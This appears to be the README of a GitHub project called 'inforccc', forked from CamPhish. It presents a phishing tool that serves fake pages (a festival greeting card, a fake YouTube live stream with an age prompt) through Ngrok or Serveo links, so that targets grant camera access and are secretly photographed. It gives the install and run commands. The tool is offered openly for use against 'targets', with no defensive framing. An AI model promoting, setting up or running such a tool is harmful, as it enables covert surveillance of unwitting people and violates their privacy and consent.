# inforccc

# inforccc 📸

**Camera Shot Capture Tool** — Grab cam shots from target's phone front camera or PC webcam by sending a link.

Forked from [CamPhish](https://github.com/baradatipu/CamPhish) by baradatipu, maintained by [cyberwithmanveer](https://github.com/cyberwithmanveer).

---

## What is inforccc?

inforccc is a technique to take cam shots of a target's phone front camera or PC webcam. It hosts a fake website on a built-in PHP server and uses Ngrok & Serveo to generate a publicly accessible link. When the target opens the link and allows camera access, the tool captures their photo.

## Features

- **Festival Wishing Template** — Customizable greeting card that requests camera access
- **Live YouTube TV Template** — Fake YouTube livestream with age verification prompt
- **Dual Tunnel Support** — Ngrok (auto-download) or Serveo.net
- **Cross-Platform** — Kali Linux, Termux, macOS, Ubuntu

## Tested On

- Kali Linux
- Termux (Android)
- macOS
- Ubuntu
- Parrot OS

## Installation

### Requirements
```bash
apt-get -y install php openssh-client curl wget unzip

### kali/termux
git clone https://github.com/cyberwithmanveer/inforccc
cd inforccc
chmod +x inforccc.sh
bash inforccc.sh

###usage
bash inforccc.sh
